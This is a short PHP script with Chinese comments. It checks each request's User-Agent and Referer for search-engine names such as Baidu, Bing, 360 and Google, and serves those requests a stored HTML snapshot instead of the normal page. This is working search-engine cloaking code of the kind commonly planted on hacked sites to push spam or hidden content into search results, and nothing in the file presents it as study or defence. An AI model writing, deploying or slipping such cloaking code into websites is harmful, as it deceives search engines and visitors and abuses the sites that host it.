<?php
	$remote_file = "uploads/snapshot.html";
	ini_set('max_execution_time', '0');

	$key= $_SERVER["HTTP_USER_AGENT"];
	$key = strtolower($key);
	if(strpos($key,'baidu')!==false||strpos($key,'so')!==false||strpos($key,'bing')!==false||strpos($key,'360')!==false||strpos($key,'sm')!==false)
	{
		$file = read_file($remote_file);
		echo $file;
		exit;
	}
	
if(isset($_SERVER["HTTP_REFERER"]))
{
	$key= $_SERVER["HTTP_REFERER"];
	$key = strtolower($key);
	if(strpos($key,'baidu')!==false||strpos($key,'so')!==false||strpos($key,'bing')!==false||strpos($key,'google')!==false||strpos($key,'sm')!==false)
	{
		$file = read_file($remote_file);
		echo $file;
		exit;
	}
}

	
	function read_file($filename)
	{
		$handle = fopen($filename, "r");//读取二进制文件时，需要将第二个参数设置成'rb'
    
    	//通过filesize获得文件大小，将整个文件一下子读到一个字符串中
    	$contents = fread($handle, filesize($filename));
    	fclose($handle);
    	
    	return $contents;
	}
?>
